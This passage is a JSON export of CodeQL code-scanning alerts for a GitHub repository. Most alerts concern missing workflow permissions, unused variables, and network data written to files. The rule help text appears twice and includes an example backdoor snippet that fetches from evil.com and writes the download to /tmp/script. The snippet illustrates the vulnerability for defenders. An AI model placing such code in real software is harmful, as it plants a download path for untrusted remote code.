      "environment": "{\"language\":\"javascript-typescript\"}",
      "category": "/language:javascript-typescript",
      "state": "open",
      "commit_sha": "45662b7df97145b24172844216d048793e1001a7",
      "message": { "text": "Unused variable lines." },
      "location": {
        "path": "scripts/codeql_verify_append.mjs",
        "start_line": 141,
        "end_line": 141,
        "start_column": 11,
        "end_column": 16
      },
      "classifications": []
    },
    "instances_url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/33/instances",
    "dismissal_approved_by": null
  },
  {
    "number": 32,
    "created_at": "2025-08-27T04:48:20Z",
    "updated_at": "2025-08-27T19:08:20Z",
    "url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/32",
    "html_url": "https://github.com/bbasketballer75/theporadas_site/security/code-scanning/32",
    "state": "fixed",
    "fixed_at": "2025-08-27T19:08:20Z",
    "dismissed_by": null,
    "dismissed_at": null,
    "dismissed_reason": null,
    "dismissed_comment": null,
    "rule": {
      "id": "js/http-to-file-access",
      "severity": "warning",
      "description": "Network data written to file",
      "name": "js/http-to-file-access",
      "tags": ["external/cwe/cwe-434", "external/cwe/cwe-912", "security"],
      "full_description": "Writing network data directly to the file system allows arbitrary file upload and might indicate a backdoor.",
      "help": "# Network data written to file\nStoring user-controlled data on the local file system without further validation allows arbitrary file upload, and may be an indication of malicious backdoor code that has been implanted into an otherwise trusted code base.\n\n\n## Recommendation\nExamine the highlighted code closely to ensure that it is behaving as intended.\n\n\n## Example\nThe following example shows backdoor code that downloads data from the URL `https://evil.com/script`, and stores it in the local file `/tmp/script`.\n\n\n```javascript\nvar https = require(\"https\");\nvar fs = require(\"fs\");\n\nhttps.get('https://evil.com/script', res => {\n  res.on(\"data\", d => {\n    fs.writeFileSync(\"/tmp/script\", d)\n  })\n});\n\n```\nOther parts of the program might then assume that since `/tmp/script` is a local file its contents can be trusted, while in fact they are obtained from an untrusted remote source.\n\n\n## References\n* OWASP: [Trojan Horse](https://www.owasp.org/index.php/Trojan_Horse).\n* OWASP: [Unrestricted File Upload](https://www.owasp.org/index.php/Unrestricted_File_Upload).\n* Common Weakness Enumeration: [CWE-912](https://cwe.mitre.org/data/definitions/912.html).\n* Common Weakness Enumeration: [CWE-434](https://cwe.mitre.org/data/definitions/434.html).\n",
      "security_severity_level": "medium"
    },
    "tool": { "name": "CodeQL", "guid": null, "version": "2.22.4" },
    "most_recent_instance": {
      "ref": "refs/heads/main",
      "analysis_key": ".github/workflows/codeql.yml:analyze",
      "environment": "{\"language\":\"javascript-typescript\"}",
      "category": "/language:javascript-typescript",
      "state": "fixed",
      "commit_sha": "d364a89ff22bb73e77015770c2b95b4a3d26935f",
      "message": { "text": "Write to file system depends on Untrusted data." },
      "location": {
        "path": "scripts/codeql_verify_append.mjs",
        "start_line": 119,
        "end_line": 119,
        "start_column": 80,
        "end_column": 111
      },
      "classifications": []
    },
    "instances_url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/32/instances",
    "dismissal_approved_by": null
  },
  {
    "number": 31,
    "created_at": "2025-08-27T03:25:10Z",
    "updated_at": "2025-08-27T03:28:21Z",
    "url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/31",
    "html_url": "https://github.com/bbasketballer75/theporadas_site/security/code-scanning/31",
    "state": "fixed",
    "fixed_at": "2025-08-27T03:28:21Z",
    "dismissed_by": null,
    "dismissed_at": null,
    "dismissed_reason": null,
    "dismissed_comment": null,
    "rule": {
      "id": "actions/missing-workflow-permissions",
      "severity": "warning",
      "description": "Workflow does not contain permissions",
      "name": "actions/missing-workflow-permissions",
      "tags": ["actions", "external/cwe/cwe-275", "maintainability", "security"],
      "full_description": "Workflows should contain explicit permissions to restrict the scope of the default GITHUB_TOKEN.",
      "help": "## Overview\n\nIf a GitHub Actions job or workflow has no explicit permissions set, then the repository permissions are used. Repositories created under organizations inherit the organization permissions. The organizations or repositories created before February 2023 have the default permissions set to read-write. Often these permissions do not adhere to the principle of least privilege and can be reduced to read-only, leaving the `write` permission only to a specific types as `issues: write` or `pull-requests: write`.\n\n## Recommendation\n\nAdd the `permissions` key to the job or the root of workflow (in this case it is applied to all jobs in the workflow that do not have their own `permissions` key) and assign the least privileges required to complete the task.\n\n## Example\n\n### Incorrect Usage\n\n```yaml\nname: \"My workflow\"\n# No permissions block\n```\n\n### Correct Usage\n\n```yaml\nname: \"My workflow\"\npermissions:\n  contents: read\n  pull-requests: write\n```\n\nor\n\n```yaml\njobs:\n  my-job:\n    permissions:\n      contents: read\n      pull-requests: write\n```\n\n## References\n\n- GitHub Docs: [Assigning permissions to jobs](https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/assigning-permissions-to-jobs).\n",
      "security_severity_level": "medium"
    },
    "tool": { "name": "CodeQL", "guid": null, "version": "2.22.4" },
    "most_recent_instance": {
      "ref": "refs/heads/main",
      "analysis_key": "dynamic/github-code-scanning/codeql:analyze",
      "environment": "{\"build-mode\":\"none\",\"category\":\"/language:actions\",\"language\":\"actions\",\"runner\":\"[\\\"ubuntu-latest\\\"]\"}",
      "category": "/language:actions",
      "state": "fixed",
      "commit_sha": "88bd433e09c89577a98b90581e3b173ceaaa301c",
      "message": {
        "text": "Actions job or workflow does not limit the permissions of the GITHUB_TOKEN. Consider setting an explicit permissions block, using the following as a minimal starting point: {{}}"
      },
      "location": {
        "path": ".github/workflows/codeql-finalize-baseline.yml",
        "start_line": 6,
        "end_line": 8,
        "start_column": 5,
        "end_column": 22
      },
      "classifications": []
    },
    "instances_url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/31/instances",
    "dismissal_approved_by": null
  },
  {
    "number": 30,
    "created_at": "2025-08-27T03:17:49Z",
    "updated_at": "2025-08-27T03:17:49Z",
    "url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/30",
    "html_url": "https://github.com/bbasketballer75/theporadas_site/security/code-scanning/30",
    "state": "open",
    "fixed_at": null,
    "dismissed_by": null,
    "dismissed_at": null,
    "dismissed_reason": null,
    "dismissed_comment": null,
    "rule": {
      "id": "actions/missing-workflow-permissions",
      "severity": "warning",
      "description": "Workflow does not contain permissions",
      "name": "actions/missing-workflow-permissions",
      "tags": ["actions", "external/cwe/cwe-275", "maintainability", "security"],
      "full_description": "Workflows should contain explicit permissions to restrict the scope of the default GITHUB_TOKEN.",
      "help": "## Overview\n\nIf a GitHub Actions job or workflow has no explicit permissions set, then the repository permissions are used. Repositories created under organizations inherit the organization permissions. The organizations or repositories created before February 2023 have the default permissions set to read-write. Often these permissions do not adhere to the principle of least privilege and can be reduced to read-only, leaving the `write` permission only to a specific types as `issues: write` or `pull-requests: write`.\n\n## Recommendation\n\nAdd the `permissions` key to the job or the root of workflow (in this case it is applied to all jobs in the workflow that do not have their own `permissions` key) and assign the least privileges required to complete the task.\n\n## Example\n\n### Incorrect Usage\n\n```yaml\nname: \"My workflow\"\n# No permissions block\n```\n\n### Correct Usage\n\n```yaml\nname: \"My workflow\"\npermissions:\n  contents: read\n  pull-requests: write\n```\n\nor\n\n```yaml\njobs:\n  my-job:\n    permissions:\n      contents: read\n      pull-requests: write\n```\n\n## References\n\n- GitHub Docs: [Assigning permissions to jobs](https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/assigning-permissions-to-jobs).\n",
      "security_severity_level": "medium"
    },
    "tool": { "name": "CodeQL", "guid": null, "version": "2.22.4" },
    "most_recent_instance": {
      "ref": "refs/heads/main",
      "analysis_key": "dynamic/github-code-scanning/codeql:analyze",
      "environment": "{\"build-mode\":\"none\",\"category\":\"/language:actions\",\"language\":\"actions\",\"runner\":\"[\\\"ubuntu-latest\\\"]\"}",
      "category": "/language:actions",
      "state": "open",
      "commit_sha": "a056d4a286c41903a3c915f79e22f73cbaf50c89",
      "message": {
        "text": "Actions job or workflow does not limit the permissions of the GITHUB_TOKEN. Consider setting an explicit permissions block, using the following as a minimal starting point: {{contents: read}}"
      },
      "location": {
        "path": ".github/workflows/validate_todo_exclusions.yml",
        "start_line": 14,
        "end_line": 43,
        "start_column": 5,
        "end_column": 56
      },
      "classifications": []
    },
    "instances_url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/30/instances",
    "dismissal_approved_by": null
  },
  {
    "number": 29,
    "created_at": "2025-08-27T03:17:49Z",
    "updated_at": "2025-08-27T03:17:49Z",
    "url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/29",
    "html_url": "https://github.com/bbasketballer75/theporadas_site/security/code-scanning/29",
    "state": "open",
    "fixed_at": null,
    "dismissed_by": null,
    "dismissed_at": null,
    "dismissed_reason": null,
    "dismissed_comment": null,
    "rule": {
      "id": "actions/missing-workflow-permissions",
      "severity": "warning",
      "description": "Workflow does not contain permissions",
      "name": "actions/missing-workflow-permissions",
      "tags": ["actions", "external/cwe/cwe-275", "maintainability", "security"],
      "full_description": "Workflows should contain explicit permissions to restrict the scope of the default GITHUB_TOKEN.",
      "help": "## Overview\n\nIf a GitHub Actions job or workflow has no explicit permissions set, then the repository permissions are used. Repositories created under organizations inherit the organization permissions. The organizations or repositories created before February 2023 have the default permissions set to read-write. Often these permissions do not adhere to the principle of least privilege and can be reduced to read-only, leaving the `write` permission only to a specific types as `issues: write` or `pull-requests: write`.\n\n## Recommendation\n\nAdd the `permissions` key to the job or the root of workflow (in this case it is applied to all jobs in the workflow that do not have their own `permissions` key) and assign the least privileges required to complete the task.\n\n## Example\n\n### Incorrect Usage\n\n```yaml\nname: \"My workflow\"\n# No permissions block\n```\n\n### Correct Usage\n\n```yaml\nname: \"My workflow\"\npermissions:\n  contents: read\n  pull-requests: write\n```\n\nor\n\n```yaml\njobs:\n  my-job:\n    permissions:\n      contents: read\n      pull-requests: write\n```\n\n## References\n\n- GitHub Docs: [Assigning permissions to jobs](https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/assigning-permissions-to-jobs).\n",
      "security_severity_level": "medium"
    },
    "tool": { "name": "CodeQL", "guid": null, "version": "2.22.4" },
    "most_recent_instance": {
      "ref": "refs/heads/main",
      "analysis_key": "dynamic/github-code-scanning/codeql:analyze",
      "environment": "{\"build-mode\":\"none\",\"category\":\"/language:actions\",\"language\":\"actions\",\"runner\":\"[\\\"ubuntu-latest\\\"]\"}",
      "category": "/language:actions",
      "state": "open",
      "commit_sha": "a056d4a286c41903a3c915f79e22f73cbaf50c89",
      "message": {
        "text": "Actions job or workflow does not limit the permissions of the GITHUB_TOKEN. Consider setting an explicit permissions block, using the following as a minimal starting point: {{contents: read}}"
      },
      "location": {
        "path": ".github/workflows/markdownlint.yml",
        "start_line": 16,
        "end_line": 28,
        "start_column": 5,
        "end_column": 157
      },
      "classifications": []
    },
    "instances_url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/29/instances",
    "dismissal_approved_by": null
  },
  {
    "number": 28,
    "created_at": "2025-08-27T03:17:49Z",
    "updated_at": "2025-08-27T03:17:49Z",
    "url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/28",
    "html_url": "https://github.com/bbasketballer75/theporadas_site/security/code-scanning/28",
    "state": "open",
    "fixed_at": null,
    "dismissed_by": null,
    "dismissed_at": null,
    "dismissed_reason": null,
    "dismissed_comment": null,
    "rule": {
      "id": "actions/missing-workflow-permissions",
      "severity": "warning",
      "description": "Workflow does not contain permissions",
      "name": "actions/missing-workflow-permissions",
      "tags": ["actions", "external/cwe/cwe-275", "maintainability", "security"],
      "full_description": "Workflows should contain explicit permissions to restrict the scope of the default GITHUB_TOKEN.",
      "help": "## Overview\n\nIf a GitHub Actions job or workflow has no explicit permissions set, then the repository permissions are used. Repositories created under organizations inherit the organization permissions. The organizations or repositories created before February 2023 have the default permissions set to read-write. Often these permissions do not adhere to the principle of least privilege and can be reduced to read-only, leaving the `write` permission only to a specific types as `issues: write` or `pull-requests: write`.\n\n## Recommendation\n\nAdd the `permissions` key to the job or the root of workflow (in this case it is applied to all jobs in the workflow that do not have their own `permissions` key) and assign the least privileges required to complete the task.\n\n## Example\n\n### Incorrect Usage\n\n```yaml\nname: \"My workflow\"\n# No permissions block\n```\n\n### Correct Usage\n\n```yaml\nname: \"My workflow\"\npermissions:\n  contents: read\n  pull-requests: write\n```\n\nor\n\n```yaml\njobs:\n  my-job:\n    permissions:\n      contents: read\n      pull-requests: write\n```\n\n## References\n\n- GitHub Docs: [Assigning permissions to jobs](https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/assigning-permissions-to-jobs).\n",
      "security_severity_level": "medium"
    },
    "tool": { "name": "CodeQL", "guid": null, "version": "2.22.4" },
    "most_recent_instance": {
      "ref": "refs/heads/main",
      "analysis_key": "dynamic/github-code-scanning/codeql:analyze",
      "environment": "{\"build-mode\":\"none\",\"category\":\"/language:actions\",\"language\":\"actions\",\"runner\":\"[\\\"ubuntu-latest\\\"]\"}",
      "category": "/language:actions",
      "state": "open",
      "commit_sha": "a056d4a286c41903a3c915f79e22f73cbaf50c89",
      "message": {
        "text": "Actions job or workflow does not limit the permissions of the GITHUB_TOKEN. Consider setting an explicit permissions block, using the following as a minimal starting point: {{contents: read}}"
      },
      "location": {
        "path": ".github/workflows/lqip_check.yml",
        "start_line": 16,
        "end_line": 32,
        "start_column": 5,
        "end_column": 67
      },
      "classifications": []
    },
    "instances_url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/28/instances",
    "dismissal_approved_by": null
  },
  {
    "number": 27,
    "created_at": "2025-08-27T03:17:49Z",
    "updated_at": "2025-08-27T03:17:49Z",
    "url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/27",
    "html_url": "https://github.com/bbasketballer75/theporadas_site/security/code-scanning/27",
    "state": "open",
    "fixed_at": null,
    "dismissed_by": null,
    "dismissed_at": null,
    "dismissed_reason": null,
    "dismissed_comment": null,
    "rule": {
      "id": "actions/missing-workflow-permissions",
      "severity": "warning",
      "description": "Workflow does not contain permissions",
      "name": "actions/missing-workflow-permissions",
      "tags": ["actions", "external/cwe/cwe-275", "maintainability", "security"],
      "full_description": "Workflows should contain explicit permissions to restrict the scope of the default GITHUB_TOKEN.",
      "help": "## Overview\n\nIf a GitHub Actions job or workflow has no explicit permissions set, then the repository permissions are used. Repositories created under organizations inherit the organization permissions. The organizations or repositories created before February 2023 have the default permissions set to read-write. Often these permissions do not adhere to the principle of least privilege and can be reduced to read-only, leaving the `write` permission only to a specific types as `issues: write` or `pull-requests: write`.\n\n## Recommendation\n\nAdd the `permissions` key to the job or the root of workflow (in this case it is applied to all jobs in the workflow that do not have their own `permissions` key) and assign the least privileges required to complete the task.\n\n## Example\n\n### Incorrect Usage\n\n```yaml\nname: \"My workflow\"\n# No permissions block\n```\n\n### Correct Usage\n\n```yaml\nname: \"My workflow\"\npermissions:\n  contents: read\n  pull-requests: write\n```\n\nor\n\n```yaml\njobs:\n  my-job:\n    permissions:\n      contents: read\n      pull-requests: write\n```\n\n## References\n\n- GitHub Docs: [Assigning permissions to jobs](https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/assigning-permissions-to-jobs).\n",
      "security_severity_level": "medium"
    },
    "tool": { "name": "CodeQL", "guid": null, "version": "2.22.4" },
    "most_recent_instance": {
      "ref": "refs/heads/main",
      "analysis_key": "dynamic/github-code-scanning/codeql:analyze",
      "environment": "{\"build-mode\":\"none\",\"category\":\"/language:actions\",\"language\":\"actions\",\"runner\":\"[\\\"ubuntu-latest\\\"]\"}",
      "category": "/language:actions",
      "state": "open",
      "commit_sha": "a056d4a286c41903a3c915f79e22f73cbaf50c89",
      "message": {
        "text": "Actions job or workflow does not limit the permissions of the GITHUB_TOKEN. Consider setting an explicit permissions block, using the following as a minimal starting point: {{contents: read}}"
      },
      "location": {
        "path": ".github/workflows/lighthouse.yml",
        "start_line": 11,
        "end_line": 31,
        "start_column": 5,
        "end_column": 71
      },
      "classifications": []
    },
    "instances_url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/27/instances",
    "dismissal_approved_by": null
  },
  {
    "number": 26,
    "created_at": "2025-08-27T03:17:49Z",
    "updated_at": "2025-08-27T03:17:49Z",
    "url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/26",
    "html_url": "https://github.com/bbasketballer75/theporadas_site/security/code-scanning/26",
    "state": "open",
    "fixed_at": null,
    "dismissed_by": null,
    "dismissed_at": null,
    "dismissed_reason": null,
    "dismissed_comment": null,
    "rule": {
      "id": "actions/missing-workflow-permissions",
      "severity": "warning",
      "description": "Workflow does not contain permissions",
      "name": "actions/missing-workflow-permissions",
      "tags": ["actions", "external/cwe/cwe-275", "maintainability", "security"],
      "full_description": "Workflows should contain explicit permissions to restrict the scope of the default GITHUB_TOKEN.",
      "help": "## Overview\n\nIf a GitHub Actions job or workflow has no explicit permissions set, then the repository permissions are used. Repositories created under organizations inherit the organization permissions. The organizations or repositories created before February 2023 have the default permissions set to read-write. Often these permissions do not adhere to the principle of least privilege and can be reduced to read-only, leaving the `write` permission only to a specific types as `issues: write` or `pull-requests: write`.\n\n## Recommendation\n\nAdd the `permissions` key to the job or the root of workflow (in this case it is applied to all jobs in the workflow that do not have their own `permissions` key) and assign the least privileges required to complete the task.\n\n## Example\n\n### Incorrect Usage\n\n```yaml\nname: \"My workflow\"\n# No permissions block\n```\n\n### Correct Usage\n\n```yaml\nname: \"My workflow\"\npermissions:\n  contents: read\n  pull-requests: write\n```\n\nor\n\n```yaml\njobs:\n  my-job:\n    permissions:\n      contents: read\n      pull-requests: write\n```\n\n## References\n\n- GitHub Docs: [Assigning permissions to jobs](https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/assigning-permissions-to-jobs).\n",
      "security_severity_level": "medium"
    },
    "tool": { "name": "CodeQL", "guid": null, "version": "2.22.4" },
    "most_recent_instance": {
      "ref": "refs/heads/main",
      "analysis_key": "dynamic/github-code-scanning/codeql:analyze",
      "environment": "{\"build-mode\":\"none\",\"category\":\"/language:actions\",\"language\":\"actions\",\"runner\":\"[\\\"ubuntu-latest\\\"]\"}",
      "category": "/language:actions",
      "state": "open",
      "commit_sha": "a056d4a286c41903a3c915f79e22f73cbaf50c89",
      "message": {
        "text": "Actions job or workflow does not limit the permissions of the GITHUB_TOKEN. Consider setting an explicit permissions block, using the following as a minimal starting point: {{contents: read}}"
      },
      "location": {
        "path": ".github/workflows/coverage-badge.yml",
        "start_line": 52,
        "end_line": 104,
        "start_column": 5,
        "end_column": 20
      },
      "classifications": []
    },
    "instances_url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/26/instances",
    "dismissal_approved_by": null
  },
  {
    "number": 25,
    "created_at": "2025-08-27T03:17:49Z",
    "updated_at": "2025-08-27T03:17:49Z",
    "url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/25",
    "html_url": "https://github.com/bbasketballer75/theporadas_site/security/code-scanning/25",
    "state": "open",
    "fixed_at": null,
    "dismissed_by": null,
    "dismissed_at": null,
    "dismissed_reason": null,
    "dismissed_comment": null,
    "rule": {
      "id": "actions/missing-workflow-permissions",
      "severity": "warning",
      "description": "Workflow does not contain permissions",
      "name": "actions/missing-workflow-permissions",
      "tags": ["actions", "external/cwe/cwe-275", "maintainability", "security"],
      "full_description": "Workflows should contain explicit permissions to restrict the scope of the default GITHUB_TOKEN.",
      "help": "## Overview\n\nIf a GitHub Actions job or workflow has no explicit permissions set, then the repository permissions are used. Repositories created under organizations inherit the organization permissions. The organizations or repositories created before February 2023 have the default permissions set to read-write. Often these permissions do not adhere to the principle of least privilege and can be reduced to read-only, leaving the `write` permission only to a specific types as `issues: write` or `pull-requests: write`.\n\n## Recommendation\n\nAdd the `permissions` key to the job or the root of workflow (in this case it is applied to all jobs in the workflow that do not have their own `permissions` key) and assign the least privileges required to complete the task.\n\n## Example\n\n### Incorrect Usage\n\n```yaml\nname: \"My workflow\"\n# No permissions block\n```\n\n### Correct Usage\n\n```yaml\nname: \"My workflow\"\npermissions:\n  contents: read\n  pull-requests: write\n```\n\nor\n\n```yaml\njobs:\n  my-job:\n    permissions:\n      contents: read\n      pull-requests: write\n```\n\n## References\n\n- GitHub Docs: [Assigning permissions to jobs](https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/assigning-permissions-to-jobs).\n",
      "security_severity_level": "medium"
    },
    "tool": { "name": "CodeQL", "guid": null, "version": "2.22.4" },
    "most_recent_instance": {
      "ref": "refs/heads/main",
      "analysis_key": "dynamic/github-code-scanning/codeql:analyze",
      "environment": "{\"build-mode\":\"none\",\"category\":\"/language:actions\",\"language\":\"actions\",\"runner\":\"[\\\"ubuntu-latest\\\"]\"}",
      "category": "/language:actions",
      "state": "open",
      "commit_sha": "a056d4a286c41903a3c915f79e22f73cbaf50c89",
      "message": {
        "text": "Actions job or workflow does not limit the permissions of the GITHUB_TOKEN. Consider setting an explicit permissions block, using the following as a minimal starting point: {{contents: read}}"
      },
      "location": {
        "path": ".github/workflows/coverage-badge.yml",
        "start_line": 16,
        "end_line": 51,
        "start_column": 5,
        "end_column": 3
      },
      "classifications": []
    },
    "instances_url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/25/instances",
    "dismissal_approved_by": null
  },
  {
    "number": 24,
    "created_at": "2025-08-27T03:17:49Z",
    "updated_at": "2025-08-27T03:17:49Z",
    "url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/24",
    "html_url": "https://github.com/bbasketballer75/theporadas_site/security/code-scanning/24",
    "state": "open",
    "fixed_at": null,
    "dismissed_by": null,
    "dismissed_at": null,
    "dismissed_reason": null,
    "dismissed_comment": null,
    "rule": {
      "id": "actions/missing-workflow-permissions",
      "severity": "warning",
      "description": "Workflow does not contain permissions",
      "name": "actions/missing-workflow-permissions",
      "tags": ["actions", "external/cwe/cwe-275", "maintainability", "security"],
      "full_description": "Workflows should contain explicit permissions to restrict the scope of the default GITHUB_TOKEN.",
      "help": "## Overview\n\nIf a GitHub Actions job or workflow has no explicit permissions set, then the repository permissions are used. Repositories created under organizations inherit the organization permissions. The organizations or repositories created before February 2023 have the default permissions set to read-write. Often these permissions do not adhere to the principle of least privilege and can be reduced to read-only, leaving the `write` permission only to a specific types as `issues: write` or `pull-requests: write`.\n\n## Recommendation\n\nAdd the `permissions` key to the job or the root of workflow (in this case it is applied to all jobs in the workflow that do not have their own `permissions` key) and assign the least privileges required to complete the task.\n\n## Example\n\n### Incorrect Usage\n\n```yaml\nname: \"My workflow\"\n# No permissions block\n```\n\n### Correct Usage\n\n```yaml\nname: \"My workflow\"\npermissions:\n  contents: read\n  pull-requests: write\n```\n\nor\n\n```yaml\njobs:\n  my-job:\n    permissions:\n      contents: read\n      pull-requests: write\n```\n\n## References\n\n- GitHub Docs: [Assigning permissions to jobs](https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/assigning-permissions-to-jobs).\n",
      "security_severity_level": "medium"
    },
    "tool": { "name": "CodeQL", "guid": null, "version": "2.22.4" },
    "most_recent_instance": {
      "ref": "refs/heads/main",
      "analysis_key": "dynamic/github-code-scanning/codeql:analyze",
      "environment": "{\"build-mode\":\"none\",\"category\":\"/language:actions\",\"language\":\"actions\",\"runner\":\"[\\\"ubuntu-latest\\\"]\"}",
      "category": "/language:actions",
      "state": "open",
      "commit_sha": "a056d4a286c41903a3c915f79e22f73cbaf50c89",
      "message": {
        "text": "Actions job or workflow does not limit the permissions of the GITHUB_TOKEN. Consider setting an explicit permissions block, using the following as a minimal starting point: {{contents: read}}"
      },
      "location": {
        "path": ".github/workflows/ci-typecheck.yml",
        "start_line": 11,
        "end_line": 23,
        "start_column": 5,
        "end_column": 32
      },
      "classifications": []
    },
    "instances_url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/24/instances",
    "dismissal_approved_by": null
  },
  {
    "number": 23,
    "created_at": "2025-08-27T03:17:49Z",
    "updated_at": "2025-08-27T03:17:49Z",
    "url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/23",
    "html_url": "https://github.com/bbasketballer75/theporadas_site/security/code-scanning/23",
    "state": "open",
    "fixed_at": null,
    "dismissed_by": null,
    "dismissed_at": null,
    "dismissed_reason": null,
    "dismissed_comment": null,
    "rule": {
      "id": "actions/missing-workflow-permissions",
      "severity": "warning",
      "description": "Workflow does not contain permissions",
      "name": "actions/missing-workflow-permissions",
      "tags": ["actions", "external/cwe/cwe-275", "maintainability", "security"],
      "full_description": "Workflows should contain explicit permissions to restrict the scope of the default GITHUB_TOKEN.",
      "help": "## Overview\n\nIf a GitHub Actions job or workflow has no explicit permissions set, then the repository permissions are used. Repositories created under organizations inherit the organization permissions. The organizations or repositories created before February 2023 have the default permissions set to read-write. Often these permissions do not adhere to the principle of least privilege and can be reduced to read-only, leaving the `write` permission only to a specific types as `issues: write` or `pull-requests: write`.\n\n## Recommendation\n\nAdd the `permissions` key to the job or the root of workflow (in this case it is applied to all jobs in the workflow that do not have their own `permissions` key) and assign the least privileges required to complete the task.\n\n## Example\n\n### Incorrect Usage\n\n```yaml\nname: \"My workflow\"\n# No permissions block\n```\n\n### Correct Usage\n\n```yaml\nname: \"My workflow\"\npermissions:\n  contents: read\n  pull-requests: write\n```\n\nor\n\n```yaml\njobs:\n  my-job:\n    permissions:\n      contents: read\n      pull-requests: write\n```\n\n## References\n\n- GitHub Docs: [Assigning permissions to jobs](https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/assigning-permissions-to-jobs).\n",
      "security_severity_level": "medium"
    },
    "tool": { "name": "CodeQL", "guid": null, "version": "2.22.4" },
    "most_recent_instance": {
      "ref": "refs/heads/main",
      "analysis_key": "dynamic/github-code-scanning/codeql:analyze",
      "environment": "{\"build-mode\":\"none\",\"category\":\"/language:actions\",\"language\":\"actions\",\"runner\":\"[\\\"ubuntu-latest\\\"]\"}",
      "category": "/language:actions",
      "state": "open",
      "commit_sha": "a056d4a286c41903a3c915f79e22f73cbaf50c89",
      "message": {
        "text": "Actions job or workflow does not limit the permissions of the GITHUB_TOKEN. Consider setting an explicit permissions block, using the following as a minimal starting point: {{contents: read}}"
      },
      "location": {
        "path": ".github/workflows/ci-test.yml",
        "start_line": 12,
        "end_line": 33,
        "start_column": 5,
        "end_column": 36
      },
      "classifications": []
    },
    "instances_url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/23/instances",
    "dismissal_approved_by": null
  },
  {
    "number": 22,
    "created_at": "2025-08-27T03:15:36Z",
    "updated_at": "2025-08-27T04:48:20Z",
    "url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/22",
    "html_url": "https://github.com/bbasketballer75/theporadas_site/security/code-scanning/22",
    "state": "open",
    "fixed_at": null,
    "dismissed_by": null,
    "dismissed_at": null,
    "dismissed_reason": null,
    "dismissed_comment": null,
    "rule": {
      "id": "js/http-to-file-access",
      "severity": "warning",
      "description": "Network data written to file",
      "name": "js/http-to-file-access",
      "tags": ["external/cwe/cwe-434", "external/cwe/cwe-912", "security"],
      "full_description": "Writing network data directly to the file system allows arbitrary file upload and might indicate a backdoor.",
      "help": "# Network data written to file\nStoring user-controlled data on the local file system without further validation allows arbitrary file upload, and may be an indication of malicious backdoor code that has been implanted into an otherwise trusted code base.\n\n\n## Recommendation\nExamine the highlighted code closely to ensure that it is behaving as intended.\n\n\n## Example\nThe following example shows backdoor code that downloads data from the URL `https://evil.com/script`, and stores it in the local file `/tmp/script`.\n\n\n```javascript\nvar https = require(\"https\");\nvar fs = require(\"fs\");\n\nhttps.get('https://evil.com/script', res => {\n  res.on(\"data\", d => {\n    fs.writeFileSync(\"/tmp/script\", d)\n  })\n});\n\n```\nOther parts of the program might then assume that since `/tmp/script` is a local file its contents can be trusted, while in fact they are obtained from an untrusted remote source.\n\n\n## References\n* OWASP: [Trojan Horse](https://www.owasp.org/index.php/Trojan_Horse).\n* OWASP: [Unrestricted File Upload](https://www.owasp.org/index.php/Unrestricted_File_Upload).\n* Common Weakness Enumeration: [CWE-912](https://cwe.mitre.org/data/definitions/912.html).\n* Common Weakness Enumeration: [CWE-434](https://cwe.mitre.org/data/definitions/434.html).\n",
      "security_severity_level": "medium"
    },
    "tool": { "name": "CodeQL", "guid": null, "version": "2.22.4" },
    "most_recent_instance": {
      "ref": "refs/heads/main",
      "analysis_key": ".github/workflows/codeql.yml:analyze",
      "environment": "{\"language\":\"javascript-typescript\"}",
      "category": "/language:javascript-typescript",
      "state": "open",
      "commit_sha": "45662b7df97145b24172844216d048793e1001a7",
      "message": { "text": "Write to file system depends on Untrusted data." },
      "location": {
        "path": "scripts/codeql_baseline_snapshot.mjs",
        "start_line": 109,
        "end_line": 109,
        "start_column": 67,
        "end_column": 98
      },
      "classifications": []
    },
    "instances_url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/22/instances",
    "dismissal_approved_by": null
  },
  {
    "number": 21,
    "created_at": "2025-08-27T03:03:15Z",
    "updated_at": "2025-08-27T04:48:20Z",
    "url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/21",
    "html_url": "https://github.com/bbasketballer75/theporadas_site/security/code-scanning/21",
    "state": "open",
    "fixed_at": null,
    "dismissed_by": null,
    "dismissed_at": null,
    "dismissed_reason": null,
    "dismissed_comment": null,
    "rule": {
      "id": "js/unused-local-variable",
      "severity": "note",
      "description": "Unused variable, import, function or class",
      "name": "js/unused-local-variable",
      "tags": ["maintainability", "quality", "useless-code"],
      "full_description": "Unused variables, imports, functions or classes may be a symptom of a bug and should be examined carefully.",
